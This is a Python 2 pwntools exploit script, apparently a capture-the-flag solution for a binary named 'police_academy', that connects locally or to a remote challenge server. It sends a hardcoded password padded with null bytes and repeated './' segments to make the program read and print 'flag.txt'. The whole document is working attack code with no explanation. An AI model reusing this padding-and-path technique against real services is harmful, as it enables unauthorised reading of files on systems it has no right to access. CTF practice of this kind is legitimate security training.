#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./police_academy")
    elf = ELF("./police_academy")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("128.199.224.175", 13000)
    elf = ELF("./police_academy")
    #  libc = ELF("")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io, "b *0x400AB6")

if __name__ == "__main__":
    payload = "kaiokenx20".ljust(16, "\x00")
    payload += "./" * ((36 - 8) / 2)
    payload += "flag.txt"
    print payload
    io.sendlineafter(" : ", payload)
    io.sendlineafter(" :- ", "8")
    print io.recvall()
    io.close()
